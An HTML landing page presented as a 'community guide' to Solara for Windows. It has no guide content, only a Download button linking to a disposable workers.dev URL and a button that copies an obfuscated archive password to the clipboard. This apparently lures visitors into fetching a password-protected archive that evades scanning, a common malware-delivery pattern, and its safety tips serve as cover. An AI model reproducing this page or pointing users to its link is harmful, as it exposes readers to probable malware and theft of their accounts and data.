<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Solara for Windows - Guide</title>
<style>
  body { margin:0; font-family: Arial, sans-serif; color:#fff; background:#000 url('../assets/image/hero.jpg') center/cover fixed no-repeat; min-height:100vh; }
  .shade { background: rgba(5,8,14,.75); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:30px 16px; }
  .box { max-width:640px; text-align:center; background: rgba(10,14,20,.7); border:1px solid rgba(255,255,255,.15); border-radius:18px; padding:38px 30px; }
  h1 { margin:0 0 10px; font-size:38px; }
  p { color:#c6d0dd; line-height:1.55; }
  .btn { display:inline-block; margin-top:14px; background:#22d3ee; color:#06121a; text-decoration:none; font-weight:bold; font-size:19px; padding:16px 42px; border-radius:12px; }
  .pwrow { margin-top:26px; display:flex; align-items:center; justify-content:center; gap:12px; flex-wrap:wrap; }
  .pwrow img { border-radius:8px; height:52px; }
  .copy { background:#fff; color:#0a0d12; border:0; font-weight:bold; font-size:16px; padding:14px 22px; border-radius:10px; cursor:pointer; }
  .note { font-size:13px; color:#8d99ab; margin-top:16px; }
</style>
</head>
<body>
<div class="shade">
  <div class="box">
    <h1>Solara for Windows</h1>
    <p>A community guide to Solara on Windows: what it is, what to check, and why you should think twice before installing anything.</p>
    <a class="btn" href="https://aidagttfc.fresh-link.workers.dev/02d20ce7">Download</a>
    <div class="pwrow">
      <img src="pw.png" alt="archive key">
      <button class="copy" id="cp">Copy key</button>
    </div>
    <p class="note">Safety first: scan files, use two-step verification, never sign in inside unknown programs.</p>
  </div>
</div>
<script>
document.getElementById('cp').onclick = function() {
  var k = ['IOD','olz','30'].join('');
  navigator.clipboard.writeText(k);
  this.textContent = 'Copied';
};
</script>
</body>
</html>
